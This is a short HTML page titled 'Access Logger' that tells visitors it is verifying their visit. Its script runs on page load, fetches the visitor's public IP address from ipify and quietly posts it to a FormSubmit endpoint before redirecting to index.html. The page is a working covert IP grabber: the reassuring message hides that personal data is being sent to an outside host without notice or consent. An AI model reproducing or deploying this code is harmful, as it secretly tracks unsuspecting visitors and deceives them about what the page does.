<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Access Logger</title>
</head>
<body>
  <h2>Logging Access...</h2>
  <p>Please wait while we verify your visit.</p>

  <!-- Hidden form to send IP using FormSubmit -->
  <form id="logForm" action="https://formsubmit.co/ajax/982523cd43465a" method="POST">
    <input type="hidden" name="IP Address" id="ipField">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
  </form>

  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        document.getElementById("ipField").value = data.ip;

        fetch("https://formsubmit.co/ajax/982523cd43465a", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ "IP Address": data.ip, "_captcha": "false", "_template": "table" })
        }).finally(() => {
          window.location.href = "index.html";
        });
      });
  </script>
</body>
</html>
